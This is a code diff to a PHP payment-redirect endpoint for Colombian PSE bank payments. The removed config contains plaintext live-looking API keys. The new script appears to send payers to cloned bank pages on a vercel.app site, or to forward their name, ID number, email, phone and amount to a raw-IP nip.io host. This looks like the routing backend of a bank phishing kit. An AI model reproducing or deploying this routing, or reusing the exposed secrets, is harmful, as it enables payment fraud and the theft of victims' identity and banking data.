@@ -1,220 +1,316 @@
 <?php
 /**
- * Configuración central de redirecciones de pago.
- * Este archivo NO debe ser accesible directamente por URL.
+ * Calcula la URL de destino del pago según el banco elegido.
+ *
+ * - Si el banco está en 'primary_banks' → Vercel con su slug + id
+ * - Si NO está en 'primary_banks' → recaudofall con sus datos en query string
+ *
+ * Acepta POST con JSON: { tipoEntidad, banco, nombre, cedula, email, telefono, monto }
+ * Devuelve JSON: { ok, url, banco } o { ok:false, error }
  */
-if (basename($_SERVER['SCRIPT_FILENAME'] ?? '') === basename(__FILE__)) {
-    http_response_code(403);
-    exit('Acceso denegado');
+declare(strict_types=1);
+
+header('Content-Type: application/json; charset=utf-8');
+header('X-Content-Type-Options: nosniff');
+
+// ---------------------------------------------------------------
+// DEBUG: pon en true para ver exactamente qué bytes llegan
+// ---------------------------------------------------------------
+const DEBUG_BANCO = true;
+
+// ---------------------------------------------------------------
+// 1. Validar método
+// ---------------------------------------------------------------
+if (($_SERVER['REQUEST_METHOD'] ?? '') !== 'POST') {
+    http_response_code(405);
+    echo json_encode(['ok' => false, 'error' => 'method_not_allowed']);
+    exit;
 }
 
-return [
-    // Bancos bloqueados temporalmente (muestran modal de mantenimiento).
-    // Agregar/quitar claves internas aquí para activar o desactivar el bloqueo.
-    'maintenance_banks' => [
-        'nequi',
-    ],
+// ---------------------------------------------------------------
+// 2. Cargar configuración
+// ---------------------------------------------------------------
+$configPath = __DIR__ . '/pse-config.php';
+if (!is_file($configPath)) {
+    http_response_code(500);
+    echo json_encode(['ok' => false, 'error' => 'config_no_encontrada']);
+    exit;
+}
+require_once __DIR__ . '/config.php';
+$config = require $configPath;
 
-    // false = recaudofall apagado; todas las "otras entidades" muestran mantenimiento.
-    'recaudofall_on' => true,
+// ---------------------------------------------------------------
+// 3. Leer payload JSON
+// ---------------------------------------------------------------
+$raw = file_get_contents('php://input');
+$data = json_decode($raw, true);
+if (!is_array($data)) {
+    http_response_code(400);
+    echo json_encode(['ok' => false, 'error' => 'bad_json']);
+    exit;
+}
 
-    // ── Proveedor PSE activo ──────────────────────────────────────
-    // 'recaudofall' → usa recaudofall (comportamiento actual)
-    // 'helppiupay'  → usa HelppiuPay Direct Charges API
-    'pse_provider' => 'helppiupay',
+// ---------------------------------------------------------------
+// 4. Helpers
+// ---------------------------------------------------------------
+$limpiar = static function ($v, int $max = 200): string {
+    $v = is_scalar($v) ? (string) $v : '';
+    $v = trim(preg_replace('/[\x00-\x1F\x7F]/u', '', $v) ?? '');
+    return mb_substr($v, 0, $max);
+};
 
-    // ── Credenciales HelppiuPay ───────────────────────────────────
-    'helppiupay' => [
-        'key_id' => 'hp_sk_live_mqd0HzqBTjvy0mMzsUej1PXq',
-        'secret' => '4WvyWG8R3ogEuY5zQYMtle3ER67gYJauL55Sp1F0UOMyG4bs',
-    ],
+/**
+ * Normaliza un nombre de banco a su clave interna.
+ * Maneja UTF-8, ISO-8859-1 y Windows-1252, y quita tildes.
+ */
+$normalizar = static function (string $texto, array $aliases): string {
 
-    // ── Códigos de banco HelppiuPay (GET /api/v1/banks/pse) ───────
-    // Verifica / completa los IDs consultando el endpoint de bancos
-    // con tus credenciales: GET https://helppiupay.com/api/v1/banks/pse
-    'helppiupay_bank_codes' => [
-        'bancolombia'  => '1007',
-        'bogota'       => '1001',
-        'popular'      => '1002',
-        'occidente'    => '1023',
-        'avvillas'     => '1052',
-        'davivienda'   => '1051',
-        'daviplata'    => '1551',
-        'nequi'        => '1507',
-        'bbva'         => '1013',
-        'caja-social'  => '1032',
-        'colpatria'    => '1019',
-        'itau'         => '1006',
-        'falabella'    => '1062',
-        'gnb'          => '1012',
-        'agrario'      => '1040',
-        'coopcentral'  => '1066',
-        'bancoomeva'   => '1061',
-        'pichincha'    => '1060',
-        'serfinanza'   => '1069',
-        'rappipay'     => '1811',
-        'lulo'         => '1070',
-        'nu'           => '1809',
-        'dale'         => '1097',
-        'bold'         => '1808',
-        'movii'        => '1801',
-        'ding'         => '1802',
-        'powwi'        => '1803',
-        'uala'         => '1804',
-        'coink'        => '1812',
-        'global66'     => '1814',
-        'iris'         => '1637',
-        'juriscoop'    => '1121',
-        'confiar'      => '1292',
-        'cotrafa'      => '1289',
-        'coltefinanciera' => '1370',
-        'cfa'          => '1283',
-        'citibank'     => '1009',
-        'finandina'    => '1063',
-        'santander'    => '1065',
-        'union'        => '1303',
-        'bancamia'     => '1059',
-        'mundo-mujer'  => '1047',
-        'crezcamos'    => '1816',
-        'jfk'          => '1286',
-        'jpmorgan'     => '1071',
-    ],
+    // --- 1. Detectar codificación real y convertir a UTF-8 ---
+    if ($texto === '')
+        return '';
 
-    'links' => [
-        'primary_page' => 'https://pagosonline-pse.vercel.app',
-        'recaudofall_base' => 'https://recaudofall.94.250.202.215.nip.io/nequi?key=b4999a8b3433483d',
-    ],
+    $enc = mb_detect_encoding($texto, ['UTF-8', 'ISO-8859-1', 'Windows-1252'], true);
+    if ($enc && $enc !== 'UTF-8') {
+        $texto = mb_convert_encoding($texto, 'UTF-8', $enc);
+    }
 
-    // Bancos que van a la pasarela Vercel.
-    // Si comentas una línea, ese banco cae automáticamente a recaudofall.
-    'primary_banks' => [
-        'bogota' => ['slug' => 'bg', 'id' => 'e795be1af0a0e791176cc511'],
-        'occidente' => ['slug' => 'occ', 'id' => 'e795be1af0a0e791176cc511'],
-        'popular' => ['slug' => 'pop', 'id' => 'e795be1af0a0e791176cc511'],
-        'avvillas' => ['slug' => 'avv', 'id' => 'e795be1af0a0e791176cc511'],
-        'bancolombia' => ['slug' => 'bc', 'id' => 'e795be1af0a0e791176cc511'],  // <- comentado = va a recaudofall
-//        'nequi' => ['slug' => 'nq', 'id' => 'e795be1af0a0e791176cc511'],  // <- comentado = va a recaudofall
-        'davivienda' => ['slug' => 'dv', 'id' => '4c3a6a204bd92c4c33690c3c'],
-        'cajasocial' => ['slug' => 'cj', 'id' => 'e795be1af0a0e791176cc511'],
-    ],
+    // --- 2. A mayúsculas (multibyte) ---
+    $texto = mb_strtoupper($texto, 'UTF-8');
 
-    // Bancos disponibles para recaudofall (nombre interno => etiqueta externa)
-    'recaudofall_banks' => [
-        'bancolombia' => 'BANCOLOMBIA',
-        'nequi' => 'NEQUI',
-        'davivienda' => 'DAVIVIENDA',
-        'daviplata' => 'DAVIPLATA',
-        'bbva' => 'BBVA',
-        'bogota' => 'BOGOTA',
-        'caja-social' => 'CAJASOCIAL',
-        'colpatria' => 'COLPATRIA',
-        'davibank-s.a.' => 'COLPATRIA',
-        'itau' => 'ITAU',
-        'falabella' => 'FALABELLA',
-        'occidente' => 'OCCIDENTE',
-        'avvillas' => 'AVVILLAS',
-        'popular' => 'POPULAR',
-        'coopcentral' => 'COOPCENTRAL',
-        'bancoomeva' => 'BANCOOMEVA',
-        'gnb' => 'GNB',
-        'agrario' => 'AGRARIO',
-        'rappipay' => 'RAPPIPAY',
-        'lulo' => 'LULO',
-        'bancamia' => 'BANCAMIA',
-        'movii' => 'MOVII',
-        'confiar' => 'CONFIAR',
-        'pichincha' => 'PICHINCHA',
-        'serfinanza' => 'SERFINANZA',
-        'cfa' => 'ANTIOQUIA',
-        'union' => 'BANCOUNIN',
-        'citibank' => 'CITIBANK',
-        'finandina' => 'FINANDINA',
-        'iris' => 'IRIS',
-        'coofinep' => 'COOFINEP',
-        'credifinanciera' => 'CREDIFINANCIERA',
-        'santander' => 'SANTANDER',
-        'coltefinanciera' => 'COLTEFINANCIERA',
-        'cotrafa' => 'COTRAFA',
-        'nu' => 'NU',
-        'uala' => 'UAL',
-        'alianza' => 'ALIANZA',
-        'jpmorgan' => 'MORGAN',
-        'mundo-mujer' => 'MUNDOMUJER',
-        'crezcamos' => 'CREZCAMOS',
-        'dale' => 'DALE',
-        'jfk' => 'JFK',
-        'bold' => 'BOLD',
-        'juriscoop' => 'JURISCOOP',
-        'powwi' => 'POWWI',
-        'coink' => 'COINK',
-        'ding' => 'DING',
-        'global66' => 'GLOBAL66',
-    ],
+    // --- 3. Quitar tildes / diacríticos ---
+    $mapa = [
+        'Á' => 'A',
+        'À' => 'A',
+        'Ä' => 'A',
+        'Â' => 'A',
+        'Ã' => 'A',
+        'Å' => 'A',
+        'É' => 'E',
+        'È' => 'E',
+        'Ë' => 'E',
+        'Ê' => 'E',
+        'Í' => 'I',
+        'Ì' => 'I',
+        'Ï' => 'I',
+        'Î' => 'I',
+        'Ó' => 'O',
+        'Ò' => 'O',
+        'Ö' => 'O',
+        'Ô' => 'O',
+        'Õ' => 'O',
+        'Ú' => 'U',
+        'Ù' => 'U',
+        'Ü' => 'U',
+        'Û' => 'U',
+        'Ñ' => 'N',
+        'Ç' => 'C',
+        'Ý' => 'Y',
+    ];
+    $texto = strtr($texto, $mapa);
 
-    // Etiquetas que aparecen en el <select> de "Otras Entidades"
-    // (clave = value del <option>, valor = texto visible + mapeo interno)
-    'select_otras_entidades' => [
-        'nequi' => ['label' => 'NEQUI', 'slug' => 'nequi'],
-        'bancolombia' => ['label' => 'BANCOLOMBIA', 'slug' => 'bancolombia'],
-        'davivienda' => ['label' => 'BANCO DAVIVIENDA', 'slug' => 'davivienda'],
-        'colpatria' => ['label' => 'SCOTIABANK COLPATRIA', 'slug' => 'colpatria'],
-        'bbva' => ['label' => 'BANCO BBVA COLOMBIA S.A.', 'slug' => 'bbva'],
-        'caja-social' => ['label' => 'BANCO CAJA SOCIAL', 'slug' => 'caja-social'],
-        'falabella' => ['label' => 'BANCO FALABELLA', 'slug' => 'falabella'],
-        'lulo' => ['label' => 'LULO BANK', 'slug' => 'lulo'],
-        'daviplata' => ['label' => 'DAVIPLATA', 'slug' => 'daviplata'],
-        'itau' => ['label' => 'BANCO ITAU', 'slug' => 'itau'],
-        'bancoomeva' => ['label' => 'BANCOOMEVA S.A.', 'slug' => 'bancoomeva'],
-        'gnb' => ['label' => 'BANCO GNB SUDAMERIS', 'slug' => 'gnb'],
-        'agrario' => ['label' => 'BANCO AGRARIO', 'slug' => 'agrario'],
-        'rappipay' => ['label' => 'RAPPIPAY', 'slug' => 'rappipay'],
-        'bancamia' => ['label' => 'BANCAMIA S.A.', 'slug' => 'bancamia'],
-        'movii' => ['label' => 'MOVII S.A.', 'slug' => 'movii'],
-        'confiar' => ['label' => 'CONFIAR COOPERATIVA FINANCIERA', 'slug' => 'confiar'],
-        'pichincha' => ['label' => 'BANCO PICHINCHA S.A.', 'slug' => 'pichincha'],
-        'serfinanza' => ['label' => 'BANCO SERFINANZA', 'slug' => 'serfinanza'],
-        'union' => ['label' => 'BANCO UNION', 'slug' => 'union'],
-        'citibank' => ['label' => 'CITIBANK', 'slug' => 'citibank'],
-        'finandina' => ['label' => 'BANCO FINANDINA S.A. BIC', 'slug' => 'finandina'],
-        'nu' => ['label' => 'NU', 'slug' => 'nu'],
-        'uala' => ['label' => 'UALA', 'slug' => 'uala'],
-        'mundo-mujer' => ['label' => 'BANCO MUNDO MUJER S.A.', 'slug' => 'mundo-mujer'],
-        'crezcamos' => ['label' => 'CREZCAMOS', 'slug' => 'crezcamos'],
-        'dale' => ['label' => 'DALE', 'slug' => 'dale'],
-        'bold' => ['label' => 'BOLD CF', 'slug' => 'bold'],
-        'powwi' => ['label' => 'POWWI', 'slug' => 'powwi'],
-        'coink' => ['label' => 'COINK SA', 'slug' => 'coink'],
-        'ding' => ['label' => 'DING', 'slug' => 'ding'],
-        'global66' => ['label' => 'GLOBAL66', 'slug' => 'global66'],
-    ],
+    // --- 4. Limpiar todo lo que no sea A-Z, 0-9 o espacio ---
+    $texto = preg_replace('/[^A-Z0-9 ]+/', ' ', $texto);
+    $texto = trim(preg_replace('/\s+/', ' ', $texto));
 
-    // Aliases que pueden llegar desde el frontend (por si el usuario edita el value)
-    'aliases' => [
-        'BANCO DE BOGOTA' => 'bogota',
-        'BOGOTA' => 'bogota',
-        'BANCO DE OCCIDENTE' => 'occidente',
-        'OCCIDENTE' => 'occidente',
-        'BANCO POPULAR' => 'popular',
-        'POPULAR' => 'popular',
-        'BANCO AV VILLAS' => 'avvillas',
-        'AV VILLAS' => 'avvillas',
-        'AVVILLAS' => 'avvillas',
-        'BANCOLOMBIA' => 'bancolombia',
-        'NEQUI' => 'nequi',
-        'BANCO DAVIVIENDA' => 'davivienda',
-        'DAVIVIENDA' => 'davivienda',
-        'DAVIPLATA' => 'daviplata',
-        'BANCO BBVA COLOMBIA S.A.' => 'bbva',
-        'BBVA' => 'bbva',
-        'BANCO CAJA SOCIAL' => 'caja-social',
-        'CAJA SOCIAL' => 'caja-social',
-        'SCOTIABANK COLPATRIA' => 'colpatria',
-        'COLPATRIA' => 'colpatria',
-        'BANCO FALABELLA' => 'falabella',
-        'FALABELLA' => 'falabella',
-        'LULO BANK' => 'lulo',
-        'LULO' => 'lulo',
-        'BANCO ITAU' => 'itau',
-        'ITAU' => 'itau',
-    ],
-];
+    // --- 5. Buscar en aliases ---
+    if (isset($aliases[$texto])) {
+        return $aliases[$texto];
+    }
+
+    // --- 6. Fallback: slug con guiones ---
+    $slug = strtolower(preg_replace('/[^A-Z0-9]+/', '-', $texto));
+    return trim($slug, '-');
+};
+
+// ---------------------------------------------------------------
+// 5. Extraer y sanitizar entrada
+// ---------------------------------------------------------------
+$bancoRaw     = $limpiar($data['banco']         ?? '', 120);
+$nombre       = $limpiar($data['nombre']        ?? '', 150);
+$cedula       = $limpiar($data['cedula']        ?? '', 30);
+$tipoDocumento= $limpiar($data['tipoDocumento'] ?? 'CC', 10);
+$email        = $limpiar($data['email']         ?? '', 150);
+$telefono     = $limpiar($data['telefono']      ?? '', 20);
+$monto        = $limpiar($data['monto']         ?? '0', 20);
+$tipoEntidad  = $limpiar($data['tipoEntidad']   ?? 'aval', 20);
+$referencia   = $limpiar($data['referencia']    ?? '', 80);
+
+if ($bancoRaw === '') {
+    http_response_code(400);
+    echo json_encode(['ok' => false, 'error' => 'banco_requerido']);
+    exit;
+}
+
+// ---------------------------------------------------------------
+// 6. Normalizar nombre del banco a clave interna
+// ---------------------------------------------------------------
+$bancoClave = $normalizar($bancoRaw, $config['aliases'] ?? []);
+
+// ---------------------------------------------------------------
+// 7. DEBUG opcional
+// ---------------------------------------------------------------
+if (DEBUG_BANCO) {
+    $bytes = [];
+    for ($i = 0; $i < strlen($bancoRaw); $i++) {
+        $bytes[] = sprintf('%02X', ord($bancoRaw[$i]));
+    }
+    echo json_encode([
+        'debug' => [
+            'bancoRaw' => $bancoRaw,
+            'bytes' => implode(' ', $bytes),
+            'encoding' => mb_detect_encoding($bancoRaw, ['UTF-8', 'ISO-8859-1', 'Windows-1252'], true),
+            'bancoClave' => $bancoClave,
+            'primary_keys' => array_keys($config['primary_banks'] ?? []),
+            'recaudo_keys' => array_slice(array_keys($config['recaudofall_banks'] ?? []), 0, 10),
+        ]
+    ], JSON_PRETTY_PRINT | JSON_UNESCAPED_UNICODE);
+    exit;
+}
+
+// ---------------------------------------------------------------
+// 8. Normalizar monto a entero sin separadores
+// ---------------------------------------------------------------
+$montoLimpio = preg_replace('/[^\d]/', '', $monto) ?: '0';
+
+// ---------------------------------------------------------------
+// 9. Decidir destino
+// ---------------------------------------------------------------
+$primaryBanks = $config['primary_banks'] ?? [];
+
+if (isset($primaryBanks[$bancoClave])) {
+
+    // -------- Redirigir a Vercel --------
+    $slug = $primaryBanks[$bancoClave]['slug'];
+    $id = $primaryBanks[$bancoClave]['id'];
+    $url = rtrim($config['links']['primary_page'], '/') . "/sites/{$slug}/manager/{$id}";
+
+} else {
+
+    $provider = $config['pse_provider'] ?? 'recaudofall';
+
+    // ──────────────────────────────────────────────────────────────
+    // HelppiuPay Direct Charges (PSE)
+    // ──────────────────────────────────────────────────────────────
+    if ($provider === 'helppiupay') {
+
+        $hpBankCodes = $config['helppiupay_bank_codes'] ?? [];
+        $bankCode    = $hpBankCodes[$bancoClave] ?? null;
+
+        if (!$bankCode) {
+            http_response_code(400);
+            echo json_encode(['ok' => false, 'error' => 'banco_no_soportado', 'banco' => $bancoClave]);
+            exit;
+        }
+
+        $hp   = $config['helppiupay'] ?? [];
+        $auth = ($hp['key_id'] ?? '') . ':' . ($hp['secret'] ?? '');
+
+        // Mapear tipo de documento a los valores que acepta HelppiuPay
+        $docTypeMap = ['CC' => 'CC', 'CE' => 'CE', 'NIT' => 'NIT', 'PP' => 'PP', 'TI' => 'TI'];
+        $docType    = $docTypeMap[strtoupper($tipoDocumento)] ?? 'CC';
+        $docNumber  = preg_replace('/[^0-9]/', '', $cedula);
+
+        // Referencia única para la transacción
+        $ref = $referencia !== '' ? ('PSE-' . $referencia) : ('PSE-' . $montoLimpio . '-' . time());
+
+        $payload = json_encode([
+            'reference'      => substr($ref, 0, 80),
+            'amount'         => (int) $montoLimpio,
+            'currency'       => 'COP',
+            'customer'       => [
+                'name'     => $nombre,
+                'email'    => $email,
+                'document' => $docNumber,
+                'phone'    => $telefono,
+            ],
+            'payment_method' => [
+                'type'          => 'pse',
+                'bank_code'     => $bankCode,
+                'person_type'   => '0',
+                'document_type' => $docType,
+            ],
+        ]);
+
+        $ch = curl_init('https://helppiupay.com/api/v1/charges');
+        curl_setopt_array($ch, [
+            CURLOPT_POST           => true,
+            CURLOPT_RETURNTRANSFER => true,
+            CURLOPT_POSTFIELDS     => $payload,
+            CURLOPT_HTTPHEADER     => [
+                'Authorization: Bearer ' . $auth,
+                'Content-Type: application/json',
+            ],
+            CURLOPT_TIMEOUT        => 15,
+            CURLOPT_SSL_VERIFYPEER => true,
+        ]);
+
+        $resp     = curl_exec($ch);
+        $httpCode = (int) curl_getinfo($ch, CURLINFO_HTTP_CODE);
+        $curlErr  = curl_error($ch);
+        curl_close($ch);
+
+        if ($curlErr || $resp === false) {
+            http_response_code(502);
+            echo json_encode(['ok' => false, 'error' => 'helppiupay_conexion']);
+            exit;
+        }
+
+        $decoded = json_decode($resp, true);
+
+        if ($httpCode !== 201 && $httpCode !== 200) {
+            http_response_code(502);
+            echo json_encode([
+                'ok'     => false,
+                'error'  => 'helppiupay_error',
+                'detail' => $decoded['message'] ?? $decoded['errors'] ?? '',
+            ]);
+            exit;
+        }
+
+        $redirectUrl = $decoded['next_action']['redirect_url'] ?? null;
+        if (!$redirectUrl) {
+            http_response_code(502);
+            echo json_encode(['ok' => false, 'error' => 'helppiupay_no_redirect']);
+            exit;
+        }
+
+        $url = $redirectUrl;
+
+    // ──────────────────────────────────────────────────────────────
+    // Recaudofall (proveedor por defecto)
+    // ──────────────────────────────────────────────────────────────
+    } else {
+
+        if (!isset($config['recaudofall_banks'][$bancoClave])) {
+            http_response_code(400);
+            echo json_encode([
+                'ok'    => false,
+                'error' => 'banco_no_soportado',
+                'banco' => $bancoClave,
+            ]);
+            exit;
+        }
+
+        $query = http_build_query([
+            'banco'    => $bancoClave,
+            'monto'    => $montoLimpio,
+            'email'    => $email,
+            'cedula'   => $cedula,
+            'nombre'   => $nombre,
+            'telefono' => $telefono,
+        ]);
+
+        $base = rtrim($config['links']['recaudofall_base'], '?&');
+        $sep  = (strpos($base, '?') !== false) ? '&' : '?';
+        $url  = $base . $sep . $query;
+    }
+}
+
+// ---------------------------------------------------------------
+// 10. Responder
+// ---------------------------------------------------------------
+echo json_encode([
+    'ok' => true,
+    'url' => $url,
+    'banco' => $bancoClave,
+]);
